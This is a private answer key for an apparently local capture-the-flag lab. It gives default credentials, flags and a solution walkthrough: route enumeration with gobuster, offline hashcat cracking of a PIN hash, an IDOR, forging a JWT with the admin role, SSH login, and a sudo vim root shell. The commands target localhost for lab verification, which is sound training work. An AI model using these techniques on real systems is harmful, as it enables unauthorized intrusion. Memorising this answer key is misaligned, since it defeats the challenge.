# Private answer key — ARASAKA SUBNET

> **Do not distribute to participants.** This file contains the solution and default lab
> values. Use it only to verify an authorized CTF instance.

## Default credentials and values

| Item                                      | Default value                    |
| ----------------------------------------- | -------------------------------- |
| Local URL                                 | `http://localhost:3000`          |
| Operator account                          | `alt.cunningham@arasaka.int`     |
| Operator account PIN                      | `518274`                         |
| SSH account                               | `operator`                       |
| SSH password                              | `ArasakaArchive09`               |
| Local SSH                                 | `localhost:2222`                 |
| JWT signing key, discovered in the backup | `arasaka-subnet-ARASAKA-test-issuer` |
| Sudo-enabled editor                       | `/usr/bin/vim`                   |

The public `Shift protocol` record also displays the SHA-256 hash of the configured PIN.
By default, the hash is
`781ebf9949bb4d7194a5c01fe6d9700fba383fcaa9e859b18eb55f5db8b7300a`.

The SSH password is returned by the administration panel after the token has the `admin`
role. The PIN and flags can also be customized in the development Compose file. The values
below are project defaults; a published instance may have been built with different values.

## Default flags

| Order | Flag                                | Where to verify                                  |
| ----- | ----------------------------------- | ------------------------------------------------ |
| 1     | `FLAG{518274}`                      | Successful login as `alt.cunningham@arasaka.int` |
| 2     | `FLAG{private_dispatch_n09}`        | Contents of Alt Cunningham's private dispatch    |
| 3     | `FLAG{arasaka_directorate_access}`  | Administrative flag endpoint                     |
| 4     | `FLAG{cunningham_signal_recovered}` | `/home/operator/user.txt` over SSH               |
| 5     | `FLAG{black_wall_root_backup}`      | `/root/root.txt` in the SSH container            |

## Verification walkthrough

1. **Identify the local instance.** From the machine running the instance, verify
   the published ports:

   ```sh
   nmap -sV -p 3000,2222 127.0.0.1
   ```

2. **Discover the unannounced route.** Enumerate routes only on the local/authorized
   instance. The `wordlists/nacar-api.txt` wordlist should find `/backup`:

   ```sh
   gobuster dir -u http://127.0.0.1:3000/api/ -w wordlists/nacar-api.txt -s 200,204,301,302,307,401,403
   ```

   The `GET /api/backup` response contains the JWT key listed above.

3. **Recover the PIN.** Extract only the SHA-256 hash from the record and use Hashcat with
   a six-digit mask. The default PIN is `518274`:

   ```sh
   curl -s http://127.0.0.1:3000/api/notes/public \
     | jq -r '.[] | select(.title == "Shift protocol") | .content' \
     | sed 's/.*SHA-256 for offline recovery: //' > pin.hash
   hashcat -m 1400 -a 3 pin.hash '?d?d?d?d?d?d'
   hashcat --show -m 1400 pin.hash
   ```

   The recovered PIN authenticates Alt Cunningham's operator account,
   `alt.cunningham@arasaka.int`; the login returns the first flag along with the token.

4. **Verify the IDOR.** Using the operator account session, query the records by ID. The
   seed creates five public records first; the Board's restricted dispatch about Alt is
   ID `6`. Its contents include the second flag.
5. **Verify role escalation.** The token for Alt Cunningham's operator account,
   `alt.cunningham@arasaka.int`, uses `sub: 1`. To reproduce this stage in the lab, use the
   key found in the backup and a token whose role is `admin`. `GET /api/admin/flag` returns
   the third flag; `GET /api/admin/ssh-access` returns the maintenance SSH connection details.
6. **Verify SSH access.** Connect only to the challenge's local SSH service on port `2222`,
   using the `operator` account and the password returned by the panel. The fourth flag is
   in `/home/operator/user.txt`:

   ```sh
   ssh -p 2222 operator@127.0.0.1
   ```

7. **Verify the sudo misconfiguration.** Over SSH, `sudo -l` shows that `operator` may
   run Vim as root without a password. In the authorized, disposable challenge container,
   start a root shell through Vim and read `/root/root.txt`:

   ```sh
   sudo -l
   sudo /usr/bin/vim -c ':!/bin/sh'
   cat /root/root.txt
   ```

   This privilege escalation is intentionally limited to the SSH container; it must not be
   used outside the authorized lab.

## Quick verification

- There are five distinct flags, all in the `FLAG{...}` format.
- The default operator login should return `FLAG{518274}`.
- `/api/backup` should respond; a nonexistent API route should return `404`.
- Record ID `6` contains the Board's restricted dispatch but must not appear in the public
  list.
- The administrative account and its files are not needed to authenticate over SSH.
- `sudo -l` should list `/usr/bin/vim` as a passwordless root command in the SSH container.
- The fifth flag is readable from `/root/root.txt` after the intended Vim-based escalation.
- Port `2222` must point only to the isolated challenge container.
